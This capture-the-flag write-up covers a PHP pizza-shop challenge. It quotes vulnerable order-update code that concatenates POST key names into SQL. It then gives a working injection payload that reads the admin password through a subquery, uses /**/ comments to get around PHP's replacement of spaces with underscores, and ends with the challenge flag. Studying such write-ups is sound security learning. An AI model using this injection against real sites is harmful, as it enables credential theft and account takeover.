# Pizza Shop

## Analysis

The problem gives you the code for a pizza shop website written in PHP. Once started via Docker, the website is available on port 8000. We are presented with a login/register screen where we can create a local account. Once logged in, we are presented with a dashboard where we can place a new order, and a button that takes us to see previous orders. If any orders have been placed, we will have the option to edit them.

## Solution

By analyzing the code, we will notice the presence of two `.php` files that manage the creation and updating of orders: [`place_order.php`](Source/src/place_order.php) and [`update_order.php`](Source/src/update_order.php). In the first file we will see that the creation of an SQL query for inserting the new order. This is done using proper parameter bindings, so it does not seem vulnerable to SQL Injection. However, when we look at the code for updating an order, we will notice a particularly interesting snippet of the query building:

```php
foreach($_POST as $key => $value) {
    $new_order[$key] = $value;
}

// [...]

foreach ($new_order as $key => $value) {
    if($order[$key] != $new_order[$key]) {
        $sql .= ", $key = ?";
        array_push($updated_data, $new_order[$key]);
        $updated_data_types .=  gettype($new_order[$key]) == 'double' ? 'd': 's'; 
    }
}
```

In this snippet we can see that the code is taking all of the keys sent as part of the POST request and adding them to the `$new_order` object. Furthermore, for each key in this object, if the provided value does not match the value in the original order, some unsafe string concatenation is going to happen with the value of the key. In other words, while the intended behavior is to have a key, say, `instructions`, and to update the SQL template like `instructions = ?` so that a parameter value can be bound, nothing stops us from adding more content to the name of the key.

First, we need to place an order. We will do so by sending the following parameters as a request:

```python
{
    "pizza_id": "1,2,3,4",
    "quantity": "1,0,0,0",
    "instructions": "",
}
```

This is saying we will have a single pizza of the type that has ID = 1. This will give us an order ID. We can now update the same order, but this time we will be sending the following injection as a key:

```python
injection = "instructions=SELECT password FROM users WHERE username = 'admin',order_id"

content = {
    "pizza_id": "1,2,3,4",
    "quantity": "1,0,0,0",
    "instructions": "",
    injection: order_id,
}
```

If everything goes according to plan, the server will append the key `"instructions=SELECT password FROM users WHERE username = 'admin',order_id"` to the SQL query it builds, causing it to retrieve the admin user's password. We are including the `,order_id` portion to the end to make sure that the number of parameters matches what is getting bound by the server. To make sure we don't change too much, we are passing the original value for the `order_id`.

We would expect the executed query should be similar to:

```sql
UPDATE orders SET order_date = CURRENT_TIMESTAMP, instructions=(SELECT password FROM users WHERE username = 'admin'),order_id = 1 WHERE order_id = 1
```

You will notice, however, that the executed query is more like this (notice the `_` characters):

```sql
UPDATE orders SET order_date = CURRENT_TIMESTAMP, instructions=(SELECT_password_FROM_users_WHERE_username_=_'admin'),order_id = 1 WHERE order_id = 1
```

This happens because the PHP server will replace our spaces with `_` to avoid confusion between keys and values (as in, to stop exactly what we are trying to do). Not only does this change the value of key, it makes the query fail as well. We need to replace the spaces with another character that indicates to SQL that we want to separate the words - also known as 'to cause tokenization' - while not being modified by PHP. We can achieve that by sending `/**/`. This gets treated as a comment by SQL which, despite being empty, causes tokenization.

Therefore, our injection should be:

```sql
UPDATE orders SET order_date = CURRENT_TIMESTAMP, instructions=(SELECT/**/password/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'),order_id = 1 WHERE order_id = 1
```

Now the query should execute successfully. Note that the `instructions` value will *NOT* change on the current page. You will need to navigate to the `view_orders.php` page to see the updated value. (I, embarassingly, spent way too much time trying to figure out what was wrong with my injection while the only problem was that I was not seeing the updated value).

The value of the instructions on the order will be the admin user's password. You can now login as admin using that password and you will be greeted with the flag:

`PWNSEC{I_D0NT_L1K3_SP4C3S_1N_SQL}`